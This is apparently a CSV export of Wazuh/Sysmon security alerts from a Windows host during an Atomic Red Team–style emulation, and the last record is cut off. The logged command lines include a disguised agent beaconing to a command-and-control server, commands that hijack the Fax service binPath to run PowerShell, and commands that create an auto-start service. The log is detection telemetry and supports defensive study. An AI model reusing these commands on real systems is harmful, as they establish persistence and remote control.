wazuh-alerts-4.x-2024.12.10,ZvRRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:07:39.742
ProcessGuid: {15959494-8365-6758-6104-000000000300}
ProcessId: 9844
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_zyqmk3de.f1v.ps1
CreationUtcTime: 2024-12-10 18:07:39.742
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:07:39.7463915Z,10567,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,36,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:07:40.494",EventChannel,1733854060,"Dec 10, 2024 @ 18:07:40.494", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8365-6758-6104-000000000300},9844,07:39.7, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zyqmk3de.f1v.ps1,07:39.7, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,afRRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:08:31.192
ProcessGuid: {15959494-8398-6758-7104-000000000300}
ProcessId: 6864
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_rdj54u2v.2ck.ps1
CreationUtcTime: 2024-12-10 18:08:31.192
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:08:31.2393027Z,10627,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,38,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:08:31.305",EventChannel,1733854111,"Dec 10, 2024 @ 18:08:31.305", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8398-6758-7104-000000000300},6864,08:31.2, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rdj54u2v.2ck.ps1,08:31.2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,cvRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:09:47.284
ProcessGuid: {15959494-83e0-6758-9704-000000000300}
ProcessId: 3452
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_zdow0kiq.ilq.ps1
CreationUtcTime: 2024-12-10 18:09:47.284
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:09:47.2961743Z,10761,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,43,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:09:48.146",EventChannel,1733854188,"Dec 10, 2024 @ 18:09:48.146", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-83e0-6758-9704-000000000300},3452,09:47.3, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zdow0kiq.ilq.ps1,09:47.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,d_RRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:10:40.355
ProcessGuid: {15959494-841f-6758-c604-000000000300}
ProcessId: 4136
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ileqwbfd.afl.ps1
CreationUtcTime: 2024-12-10 18:10:40.355
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:10:40.4376509Z,10833,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,46,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:10:40.578",EventChannel,1733854240,"Dec 10, 2024 @ 18:10:40.578", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-841f-6758-c604-000000000300},4136,10:40.4, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ileqwbfd.afl.ps1,10:40.4, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,f_RRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness
UtcTime: 2024-12-10 18:10:53.079
ProcessGuid: {15959494-7b00-6758-1200-000000000300}
ProcessId: 64
Image: C:\WINDOWS\system32\svchost.exe
TargetFilename: C:\Windows\SoftwareDistribution\Download\574ea5e93a93625d3c1b7092246bf566\Metadata\Dpx.dll
CreationUtcTime: 2023-09-13 20:17:40.000
User: NT AUTHORITY\SYSTEM""",2,2024-12-10T18:10:53.0835693Z,10894,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,3,FALSE,6,Possible DLL search order hijack by C:\\Windows\\SoftwareDistribution\\Download\\574ea5e93a93625d3c1b7092246bf566\\Metadata\\Dpx.dll created in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92219,windows_eventchannel,log,"Dec 10, 2024 @ 18:10:53.564",EventChannel,1733854253,"Dec 10, 2024 @ 18:10:53.564", , , , , , ,C:\\WINDOWS\\system32\\svchost.exe, , , , , , ,{15959494-7b00-6758-1200-000000000300},64,10:53.1, ,"technique_id=T1574.010,technique_name=Services File Permissions Weakness", , ,NT AUTHORITY\\SYSTEM,"[""DLL Search Order Hijacking"",""DLL Side-Loading""]","[""T1574.001"",""T1574.002""]","[""Persistence"",""Privilege Escalation"",""Defense Evasion""]", ,C:\\Windows\\SoftwareDistribution\\Download\\574ea5e93a93625d3c1b7092246bf566\\Metadata\\Dpx.dll,17:40.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,gvRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 18:10:53.751
ProcessGuid: {15959494-842c-6758-dd04-000000000300}
ProcessId: 9344
Image: C:\Windows\System32\MoUsoCoreWorker.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-10T18:10:53.7714784Z,10897,3884,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,4,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 18:10:54.543",EventChannel,1733854254,"Dec 10, 2024 @ 18:10:54.543", , , , , ,taskschd.dll,C:\\Windows\\System32\\MoUsoCoreWorker.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-842c-6758-dd04-000000000300},9344,10:53.8,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,hfRRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 18:11:13.240
ProcessGuid: {15959494-8441-6758-df04-000000000300}
ProcessId: 8528
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \""write-host 'T1543.003 Test'\"""" && sc start Fax
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:11:13.2453494Z,10912,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,16,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:11:14.009",EventChannel,1733854274,"Dec 10, 2024 @ 18:11:14.009", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-8441-6758-df04-000000000300},8528,11:13.2,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C sc config Fax binPath= \""C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\""write-host 'T1543.003 Test'\\\""\"" &amp;&amp; sc start Fax",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,h_RRspMBtNh2X6vnU-Ar,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 18:11:19.407
ProcessGuid: {15959494-8447-6758-e104-000000000300}
ProcessId: 3672
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ilbzeklj.qny.ps1
CreationUtcTime: 2024-12-10 18:11:19.407
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:11:19.4150003Z,10925,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,49,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:11:20.158",EventChannel,1733854280,"Dec 10, 2024 @ 18:11:20.158", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-8447-6758-e104-000000000300},3672,11:19.4, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ilbzeklj.qny.ps1,11:19.4, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,kvRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 18:13:43.680
ProcessGuid: {15959494-84d7-6758-1a05-000000000300}
ProcessId: 6152
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C start """" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:13:43.6821870Z,11102,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,20,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:13:44.456",EventChannel,1733854424,"Dec 10, 2024 @ 18:13:44.456", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-84d7-6758-1a05-000000000300},6152,13:43.7,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C start \""\"" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,lPRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 18:13:46.665
ProcessGuid: {15959494-84da-6758-2805-000000000300}
ProcessId: 6296
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C sc.exe create AtomicTestService_CMD binPath= ""411da5_AtomicService.exe"" start=auto  type=Own && sc.exe start AtomicTestService_CMD
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:13:46.6762413Z,11110,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,21,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:13:47.092",EventChannel,1733854427,"Dec 10, 2024 @ 18:13:47.092", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-84da-6758-2805-000000000300},6296,13:46.7,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C sc.exe create AtomicTestService_CMD binPath= \""411da5_AtomicService.exe\"" start=auto  type=Own &amp;&amp; sc.exe start AtomicTestService_CMD",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,l_RRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 18:13:49.994
ProcessGuid: {15959494-84d7-6758-1b05-000000000300}
ProcessId: 8340
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir8340_86171774\CRX_INSTALL\popup.bundle.js
CreationUtcTime: 2024-12-10 18:13:49.994
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:13:49.9986561Z,11117,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,54,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:13:50.151",EventChannel,1733854430,"Dec 10, 2024 @ 18:13:50.151", , , , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-84d7-6758-1b05-000000000300},8340,13:50.0, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir8340_86171774\\CRX_INSTALL\\popup.bundle.js,13:50.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,mfRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 18:13:50.619
ProcessGuid: {15959494-84d7-6758-1b05-000000000300}
ProcessId: 8340
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir8340_1019571109\CRX_INSTALL\service_worker_bin_prod.js
CreationUtcTime: 2024-12-10 18:13:50.619
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:13:50.6240607Z,11123,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,56,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:13:51.323",EventChannel,1733854431,"Dec 10, 2024 @ 18:13:51.323", , , , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-84d7-6758-1b05-000000000300},8340,13:50.6, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir8340_1019571109\\CRX_INSTALL\\service_worker_bin_prod.js,13:50.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,nPRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 18:14:08.966
ProcessGuid: {15959494-84d7-6758-1b05-000000000300}
ProcessId: 8340
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir8340_1876417444\CRX_INSTALL\assets\libs\crypto.js
CreationUtcTime: 2024-12-10 18:14:08.966
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T18:14:08.9801767Z,11183,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,59,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 18:14:09.295",EventChannel,1733854449,"Dec 10, 2024 @ 18:14:09.295", , , , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-84d7-6758-1b05-000000000300},8340,14:09.0, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir8340_1876417444\\CRX_INSTALL\\assets\\libs\\crypto.js,14:09.0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,nvRRspMBtNh2X6vnU-Bw,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 18:14:08.981
ProcessGuid: {15959494-84d7-6758-1b05-000000000300}
ProcessId: 8340
